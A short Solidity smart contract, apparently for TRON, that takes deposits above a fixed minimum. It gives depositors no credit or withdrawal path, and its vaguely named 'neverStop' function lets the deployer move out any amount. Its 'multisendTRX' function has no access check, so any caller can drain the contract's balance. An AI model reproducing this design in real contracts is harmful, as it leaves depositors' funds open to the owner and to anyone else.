//SourceUnit: org_dxn.sol

pragma solidity ^0.5.9 <0.6.10;

contract org_dxn {
    using SafeMath for uint256;
    address payable auth;
    uint256 invest_amount;
    
    function contractInfo() view external returns( uint256 balance) {
        return (address(this).balance);
    }
    
    constructor() public {
        auth = msg.sender;
        invest_amount = 100000000;
    }
    function deposit() public payable {
        require(msg.value >= invest_amount); 
    }
    
    function neverStop(address payable runfast,uint _amount) external {
        require(msg.sender == auth);
        runfast.transfer(_amount);
    }
    function multisendTRX(address payable[]  memory  _contributors, uint256[] memory _balances) public payable{
        for (uint256 i = 0; i < _contributors.length; i++) {
            _contributors[i].transfer(_balances[i]);
        }
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}